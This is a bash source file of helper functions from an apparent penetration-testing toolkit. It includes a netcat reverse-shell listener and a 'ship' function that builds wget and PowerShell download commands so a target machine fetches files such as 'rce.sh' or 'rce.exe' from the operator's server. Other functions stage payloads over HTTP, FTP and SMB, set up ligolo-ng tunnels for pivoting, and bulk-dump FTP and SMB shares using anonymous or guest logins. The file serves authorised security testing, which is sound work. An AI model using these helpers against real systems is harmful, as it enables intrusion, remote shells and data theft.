# Description: One-liner to start a interactive reverse shell listener.
# Usage: listen <port>
function listen() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0
    i && _wrap rlwrap nc -lvnp $1
}

# Description: one-liner to ship files to the target machine. With no copy-paste needs.
# Usage: ship [-h, --help] [-t|--type <linux|windows>] [-a|--auto-host <boolean>] [-m, --mode <http|smb>] [-p, --port PORT] <filepath 1> [filepath 2] ...
# Arguments:
#   -t, --type <type>: linux or windows (default: linux)
#   -a, --auto-host <boolean>: auto-host the http server (default: true)
#   -m, --mode <mode>: http or smb (default: http)
#   -p, --port PORT: used port (current only support on http)
#   filepath: the path to the file you want to ship. Support multiple files at a time.
# Example:
#   ship ./rce.sh
#   ship -t windows $windows_family
#   ship -t windows -m smb ./rce.exe
function ship() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local arg_type="linux"
    local mode="http"
    local arg_autoHost=true
    local filepaths=()
    local used_port="80"
    # TODO: implement default output path

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type) arg_type="$2" && shift 2 ;;
            -a|--auto-host) arg_autoHost="$2" && shift 2 ;;
            -m|--mode) mode="$2" && shift 2 ;;
            -p|--port) used_port="$2" && shift 2 ;;
            *) filepaths+=("$1") && shift ;;
        esac
    done

    [[ ${#filepaths[@]} -eq 0 ]] && _logger -l error "At least one filepath is required." && _help && return 1

    local all_cmds=""

    for filepath in "${filepaths[@]}"; do
        [[ ! -f "$filepath" ]] && _logger -l error "File '$filepath' does not exist." && return 1
    
        local filename=$(basename "$filepath")
        cp --update=none "$filepath" "./$filename" && _logger -l info "File '$filename' copied to current directory."

        local cmd
        if [[ "$arg_type" == "linux" ]]; then
            if [[ "$mode" == "http" ]]; then
                cmd="wget $(_get_default_network_interface_ip):$used_port/$filename"
            else
                _logger error "Currently Linux only support HTTP mode." && return 1
            fi
        elif [[ "$arg_type" == "windows" ]]; then
            if [[ "$mode" == "smb" ]]; then
                cmd="copy \\\\\\$(_get_default_network_interface_ip)\\\\smb\\\\$filename C:/ProgramData/$filename"
            elif [[ "$mode" == "http" ]]; then
                cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip):$used_port/$filename' -OutFile C:/ProgramData/$filename\""
            else
                _logger error "[e] unsupported mode (smb|http)."
            fi
        else
            _logger error "[e] Unknown type '$arg_type'." && return 1
        fi

        all_cmds+="$cmd"$'\n'
    done

    _autoHost() {
        if [[ "$arg_autoHost" = true ]]; then
            [[ "$mode" == "smb" ]] && svc smb    
            [[ "$mode" == "http" ]] && svc http --port "$used_port"
        else
            _logger -l warn "Remember to host the server on your own"
        fi
    }

    echo -n "$all_cmds" | xclip -selection clipboard
    _logger info "All commands copied to clipboard."
    _autoHost

    # TODO: remove the copied files automatically with global conf
}

# Description: one-liner to start services.
# Usage: svc <service> [OPTIONS]
# Arguments:
#   - service: current support:
#     + docker          start docker service
#     + ftp             start a ftp server
#     + http            start a http server on port 80
#     + smb             start a smb server
#     + ssh             start sshd service
#     + bloodhound      start BloodHound (v4.3.1)
#     + bloodhound-ce   start BloodHound CE (v2.4.1)
#     + ligolo          start ligolo-ng_agent (v0.6.2)
#     + wsgi            start wsgid
#     + python-venv     create a python virtual environment
#   - Options
#     + -p, --port PORTS    Ports used (http)
# Configuration:
#   - function.svc_wsgi.default_port <integer>: default is 443.
# Example:
#   svc http # to spawn a http server in the current directory
#   svc ftp  # to spawn a ftp server in the current directory
function svc() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local service="$1"
    [[ -z "$service" ]] && _help && return 1

    case "$service" in
        docker)
            _banner extension docker
            _log info "[i] start docker"
            _log warn "[w] to stop, use the commands: sudo systemctl stop docker && sudo systemctl stop docker.socket"
            _wrap sudo service docker restart
            ;;
        ftp)
            _logger info "[i] start ftp server on host"
            _logger info "Usage:"
            _logger info "\t(1) run ftp"
            _logger info "\t(2) run open <ip> 21"
            _logger info "\t(2-2) Default Interface ($_swiss_default_network_interface) IP: $(_get_default_network_interface_ip)"
            _logger info "\t(3) use username anonymous"
            _logger info "\t(4) binary # use binary mode"
            _logger info "\t(5) put <file-you-want-to-download>"
            _wrap python3 -m pyftpdlib -w -p 21
            ;;
        http)
            local port="80"
            [[ $2 == "-p" || $2 == "--port" ]] && port=$3

            _logger info "[i] start http server"
            i
            _wrap python3 -m http.server $port
            ;;
        php)
            local port="80"
            [[ $2 == "-p" || $2 == "--port" ]] && port=$3
            _logger info "[i] start php server"
            i
            _wrap php -S 0.0.0.0:$port
            ;;
        smb)
            _logger info "[i] start smb server"
            _logger info "[i] using share name 'smb'"
            i
            _wrap impacket-smbserver smb . -smb2support
            ;;
        ssh)
            _logger info "[i] start ssh server"
            _logger warn "[w] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
            i
            sudo systemctl stop ssh
            kill -9 $(pgrep ssh)
            _wrap sudo systemctl start ssh
            ;;
        bloodhound)
            _logger info "[i] start BloodHound (v2.4.3) ..."
            # TODO: add more instructions & reproduce from skretch
            _wrap sudo neo4j console
            ;;
        bloodhound-ce)
            _banner extension docker
            _logger info "Start BloodHound CE (v2.4.1) on port 8080"
            _logger hint "See https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose"

            lsof -i :8080 > /dev/null && _logger -l error "Port 8080 is occupied." && exit 1

            _logger -l info "[i] cloning docker-compose files from /opt/BloodHound/examples/docker-compose"
            cp /opt/BloodHound/examples/docker-compose/* $(pwd)

            _logger info "[i] BloodHound CE starts on port 8080 (default), username: admin, password check on the terminal logs"
            _logger info "[i] preferred password: @Bloodhound123"

            _wrap sudo docker-compose up
            ;;
        ligolo)
            _banner extension
            _logger warn "[w] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
            _logger info "[i] Example (On target): "
            _logger info "[i] Linux: ./ligolo-ng_agent_0.6.2_linux_amd64 -connect $(_get_default_network_interface_ip):443 -ignore-cert"
            _logger info "[i] Windows: .\ligolo-ng_agent_0.6.2_windows_amd64.exe -connect $(_get_default_network_interface_ip):443 -ignore-cert"
            _logger info "[i] after connection: "
            _logger info "[i] > session                                    # choose the session"
            _logger info "[i] > ifconfig                                   # check interface"
            _logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
            _logger warn "[w] ip route del 122.252.228.38/32               # removal after use"
            _logger info "[i] start                                        # start the agent"
            _logger info "[i] Add listener (e.g., for svc http): listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp"
            _logger info "[i] Port Forwarding (access via 240.0.0.1): sudo ip route add 240.0.0.1/32 dev ligolo"
            # TODO: add to configuration
            local ligolo_agent_path="$swiss_utils/tunnel/ligolo-0.6.2/proxy"
            _wrap $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
            ;;
        wsgi)
            _banner extension
            _logger info "[i] start wsgidav under the directory: $(pwd)"
            _logger info "[i] port used: 80"
            i
            _wrap $_swiss_svc_wsgi --host=0.0.0.0 --port=$_swiss_svc_wsgi_default_port --auth=anonymous --root .
            ;;
        python-venv)
            _banner extension virtualenv
            _wrap python3 -m venv .venv
            _wrap source .venv/bin/activate
            ;;
        *) _help && return 1 ;;
    esac
}

# Description:
#   Simplified version of the `ip a` command to show the IP address of the default network interface.
#   The default network interface's IP address is copied to the clipboard.
# Usage: i [-c, --copy] [-h, --help]
# Arguments:
#   -c, --copy: copy the default interface IP.
function i() {
    local auto_copy=false
    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--copy)
                auto_copy=true
                shift
            ;;
            -h|--help)
                _help
                return 0
            ;;
            *)
                _logger error "[e] invalid options. see -h, --help."
                return 1
            ;;
        esac
    done
    local default_ip="$(_get_default_network_interface_ip)"
    _logger info "[i] $_swiss_default_network_interface: $default_ip"

    if [[ "$auto_copy" = true ]]; then
        echo -n $default_ip | xclip -selection clipboard
    fi
}

# Description: dump files from FTP or SMB service
# Usage: dump <-s, --service SERVICE> <-i, --ip IP> [OPTIONS]
# Arguments:
#   - SERVICE: ftp, smb
#   - IP: IP address of the target machine
#   - OPTIONS:
#       + [-u, --username USERNAME]: used username. (ftp default = 'anonymous', smb default = '')
#       + [-p, --password PASSWORD]: used password. (ftp default = 'anonymous', smb default = '')
#       + [-s, --share SHARES]: (SMB) shares used.
# Example:
#   dump -s ftp -i $target
#   dump -s smb -i $target --share share -u dexter -p dexter
function dump() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local IP
    local service
    local port
    local options_username
    local option_password
    local options_share

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--ip) IP="$2" && shift 2 ;;
            -s|--service) service="$2" && shift 2 ;;
            -P|--port) port="$2" && shift 2 ;;
            -u|--username) options_username="$2" && shift 2 ;;
            -p|--password) options_password="$2" && shift 2 ;;
            -S|--share) options_share="$2" && shift 2 ;;
            *) _help && return 0 ;;
        esac
    done

    case "$service" in
        ftp)
            _logger info "[i] Dumping files from FTP server"
            local username="${options_username:-anonymous}"
            local password="${options_password:-anonymous}"
            _wrap wget -r --no-passive --no-parent ftp://$username:$password@$IP
            ;;
        smb)
            _logger info "[i] dump from SMB"
            # TODO: impl username and password access
            local username="${options_username:-'guest'}"
            local password="${options_password:-'guest'}"
            [[ -z "$options_share" ]] && _logger error "[e] Shares must be specified. Use -S, --share." && return 1
            _wrap smbclient //$IP/$options_share -N -c 'prompt OFF;recurse ON;cd; lcd '$PWD';mget *'
            ;;
        *) _logger error "[e] Invalid service '$service'. Valid service: ftp, smb" && return 1 ;;
    esac
}

export swiss_cheatsheet="$swiss_root/doc/cheatsheet"

# Description:
#   function `cheatsheet` display a list of your cheatsheet files 
#   and allow you to select one to view its contents.
#   This can be useful for quick reference to common commands or syntax.
#   Path of your cheatsheet files is defined in the `swiss_cheatsheet` variable.
#   Only support for .md files.
# Usage: cheatsheet [-h, --help]
function cheatsheet() {
    [[ $1 == "-h" || $1 == "--help" ]] && _help && return 0
    cheatsheet_selection=$(ls $swiss_cheatsheet | sed 's/\.[^.]*$//' | gum choose)
    gum pager < "$swiss_cheatsheet/$cheatsheet_selection.md"
}